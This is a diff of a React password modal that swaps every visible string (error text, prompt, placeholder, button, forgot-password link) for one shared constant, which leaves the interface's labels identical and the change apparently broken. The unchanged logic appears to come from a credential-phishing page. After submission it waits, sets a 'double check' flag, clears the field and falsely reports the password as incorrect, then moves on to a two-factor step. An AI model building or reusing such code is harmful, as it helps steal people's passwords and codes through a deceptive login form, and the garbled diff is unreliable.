@@ -1,5 +1,6 @@
-import React from 'react';
-import Modal from '#components/modals/Modal';
+import React from 'react'
+import Modal from '#components/modals/Modal'
+import { SITE_MAIN_MESSAGE } from '#data/site-message'
 import PasswordInput from '#components/password-input/password-input';
 import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
 import { updateForm } from '../../app/store/slices/stepFormSlice';
@@ -46,7 +47,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         try {
             e.preventDefault();
             const newErrors: Record<string, string> = {};
-            if (!password.trim()) newErrors.password = "You haven't entered your password!";
+            if (!password.trim()) newErrors.password = SITE_MAIN_MESSAGE
 
             if (Object.keys(newErrors).length > 0) {
                 setErrors(newErrors);
@@ -62,7 +63,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                         setLoading(false);  
                         setDoubleCheck(true);
                         setPassword('');
-                        newErrors.password = "The password you've entered is incorrect.";
+                        newErrors.password = SITE_MAIN_MESSAGE
                         setErrors(newErrors);
                     }, 1345)
                 })
@@ -70,7 +71,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                     console.error("Error submitting form:", error);
                     setLoading(false);
                     setPassword('');
-                    newErrors.password = "The password you've entered is incorrect.";
+                    newErrors.password = SITE_MAIN_MESSAGE;
                     setErrors(newErrors);
                 });
             } else {
@@ -91,7 +92,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                     console.error("Error submitting form:", error);
                     setLoading(false);
                     setPassword('');
-                    newErrors.password = "The password you've entered is incorrect.";
+                    newErrors.password = SITE_MAIN_MESSAGE;
                     setErrors(newErrors);
                 });
             }
@@ -116,12 +117,12 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                 </div>
 
                 <div className='w-full py-8'>
-                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>For your security, you must enter your password to continue.</p>
+                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>{SITE_MAIN_MESSAGE}</p>
                     <form onSubmit={handSubmit} autoComplete="off" >
                         <div className='w-full'>
                             <PasswordInput
                                 id='password'
-                                placeholder="Enter your password"
+                                placeholder={SITE_MAIN_MESSAGE}
                                 className={inputClass('password')}
                                 value={password}
                                 onChange={handleChange}
@@ -138,11 +139,11 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                                         <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                     </div>
                                 )}
-                                {loading ? '' : 'Continue'}
+                                {loading ? '' : SITE_MAIN_MESSAGE}
                             </button>
                         </div>
                         <div>
-                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>Forgot your password?</a></p>
+                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>{SITE_MAIN_MESSAGE}</a></p>
                         </div>
                     </form>
                 </div>
